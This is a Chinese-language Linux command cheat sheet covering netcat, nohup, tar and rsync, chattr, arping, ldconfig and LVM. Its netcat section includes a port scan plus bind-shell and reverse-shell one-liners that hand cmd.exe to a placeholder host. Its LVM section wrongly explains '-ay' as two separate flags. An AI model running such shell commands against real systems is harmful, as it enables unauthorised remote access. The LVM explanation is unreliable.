  1. nc 端口扫描

  yum install nc

  \[root@node1 \~\]# nc -vuz 192.168.0.213 22-29

  Connection to [192.168.0.213 22 port \[tcp/ssh\] succeeded!]

  nc: connect to 192.168.0.213 port 23 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 24 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 25 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 26 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 27 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 28 (tcp) failed: Connection refused

  nc: connect to 192.168.0.213 port 29 (tcp) failed: Connection refused

   

  通过这个命令可以了解到192.168.0.213这台主机22-29端口之间那个端口是开启或可以访问的。

   

  参  数: 

  [-e prog 程序重定向，一旦连接，就执行 \[危险!!\]] 

  [-g gateway source-routing hop point\[s\], up] to 8 

  -G num source-routing pointer: 4, 8, 12, ... 

  -h 帮助信息 

  -i secs 延时的间隔 

  -l 监听模式，用于入站连接 

  -n 指定数字的IP地址，不能用hostname 

  -o file 记录16进制的传输 

  -p port 本地端口号 

  -r 任意指定本地及远程端口 

  -s addr 本地源地址 

  -u UDP模式 

  -v 详细输出------用两个-v可得到更详细的内容 

  -w secs timeout的时间 

  -z 将输入输出关掉------用于扫描时 

  其中端口号可以指定一个或者用lo-hi式的指定范围。 

   

  举  例： 

  1)连接到REMOTE主机，例子： 

  格式：nc -nvv 192.168.x.x 80 

  讲解：连到192.168.x.x的TCP80端口 

  2)监听LOCAL主机，例子： 

  格式：nc -l -p 80 

  讲解：监听本机的TCP80端口 

  3)扫描远程主机，例子： 

  格式：nc -nvv -w2 -z 192.168.x.x 80-445 

  讲解：扫描192.168.x.x的TCP80到TCP445的所有端口 

  4)REMOTE主机绑定SHELL，例子： 

  格式：nc -l -p 5354 -t -e c:winntsystem32cmd.exe 

  讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口 

  5)REMOTE主机绑定SHELL并反向连接，例子： 

  格式：nc -t -e c:winntsystem32cmd.exe 192.168.x.x 5354 

  讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口 

  以上为最基本的几种用法（其实NC的用法还有很多， 

  当配合管道命令"\|"与重定向命令""等等命令功能更强大......）。

  2. linux nohup命令  

  Unix/Linux下一般想让某个程序在后台运行，很多都是使用 & 在程序结尾来让程序自动运行。比如我们要运行mysql在后台：

  nohup 命令

  用途：不挂断地运行命令。

  语法：nohup Command \[ Arg \... \] \[& \]

  描述：nohup 命令运行由 Command 参数和任何相关的 Arg 参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用 nohup 命令运行后台中的程序。要运行后台中的 nohup 命令，添加 & （ 表示\"and\"的符号）到命令的尾部。

  例子：

  下载一个东西

  \[root@iChat64 \~\]# nohup wget <http://download.fedoraproject.org/pub/fedora/linux/releases/18/Live/x86_64/Fedora-18-x86_64-Live-Desktop.iso> &

  3. tar 巧用传输文件

  主要针对一些文本文件的传输，进行压缩后体积更小，更快。

  \[root@iChat64 test\]# tar cf - . \|tar xpvf - -C /tmp/test/

  ./

  ./5.sh

  ./4.sh

  ./6.sh

  ./kmod-hpvsa-1.2.4-7.rhel6u3.x86_64.rpm.test

  ./kmod-hpvsa-1.2.4-7.rhel6u3.x86_64.rpm

  ./2.sh

  ./3.sh

  ./1.sh

   

   

  1)用于重定向stdin或stdout\[破折号, 即-\].

  2)tar cf - .  \'c\'创建一个新文档, \'f\'后边跟\'-\'指定目标文件 作为stdout

   

  3)\'-\'后边的\'f\'(file)选项, 指明作为stdout的目 标文件,并且在当前目录(\'.\')执行.

  4)tar xpvf -              \'x\'解档,

                            \'p\'保证所有权和文件属性,

                            \'v\'发完整消息到stdout,

                            \'f\'后边跟\'-\',从stdin读取数据.

  使用 rsync 提升传输速度

  \# rsync -avz /home/user1/dir1 root@\<IP address\>:/home/user2/

   -a：归档模式，保留文件属性、权限等信息。

  -v：显示详细信息。

  -z：压缩数据传输。

  4. chattr （特殊权限）

  chattr +i filename 

  #这个文件将不能被修改, 连接, 或删除, 即使是root也不行。

  #a选项将会把文件标记为只能追加数据。

  lsattr filename  #查看属性

  chattr +a filename  \[只能追加不能删除，适合日志用\] 

  [lsattr -R / 2\> /dev/null \|grep \'\^\[\^/\]\...i\'  ] [ \[查找系统里所有 i 的文件\]]

  \# 其它 "\-\-\-\-\-\-\-\-\-\-\-\--e- /etc/fstab" 大概的意思是：这个'e\'属性表示，该文件在磁盘块映射上使用了extents。 这里的extents我们可以理解成是一个连续的范围。这个属性是不能通过chattr去除的。

  23. arping 

  arping命令是用于发送arp请求到一个相邻主机的工具，arping使用arp数据包，通过ping命令检查设备上的硬件地址。能够测试一个ip地址是否是在网络上已经被使用，并能够获取更多设备信息。功能类似于ping。

  \[root@localhost \~\]# arping -I eth0 192.168.13.1

  ARPING 192.168.13.1 from 192.168.13.130 eth0

  42. 查看系统当前库文件是否存在

  \[root@rh79 \~\]# ldconfig -p \| grep libc.so.6

      libc.so.6 (libc6,x86-64, OS ABI: Linux 2.6.32) =\> /lib64/libc.so.6

  ldconfig 命令用于管理 Linux 系统的动态链接库。

  执行 ldconfig 命令，默认会在 /lib 和 /usr/lib 目录以及动态库配置文件 /etc/ld.so.conf 内所列出的目录下

  -p 或 \--print-cache ：指示 ldconfig 打印出当前缓存文件所保存的所有共享库的名字。

  》将 libfoo.so 共享库添加到系统标准库路径

  \$ cp /home/username/foo/libfoo.so /usr/lib

  \$ chmod 0755 /usr/lib/libfoo.so

  更新共享库缓存列表

  \$ sudo ldconfig

  更新完成后检查（从当前缓存文件的中搜索 libfoo.so 库）

  \$ ldconfig -p \| grep foo

      libfoo.so (libc6) =\> /usr/lib/libfoo.so

  47. lvm 系列命令

  1） lvm vgchange -ay

  》LVM 会尝试激活系统中所有处于未激活状态的卷组。这将导致系统上的逻辑卷变为可用状态，可以被挂载并用于存储数据。

  vgchange: 这部分命令指示 LVM 工具执行卷组的更改操作。

   

  -ay: 这是选项的组合，具有以下含义：

  - -a: 激活选项。它告诉 LVM 激活卷组，使其内部的逻辑卷变得可用。
  - -y: 在执行命令时不要提示确认。通常情况下，LVM 会要求用户确认激活操作，但使用 -y 选项可以跳过确认步骤，直接执行激活操作。
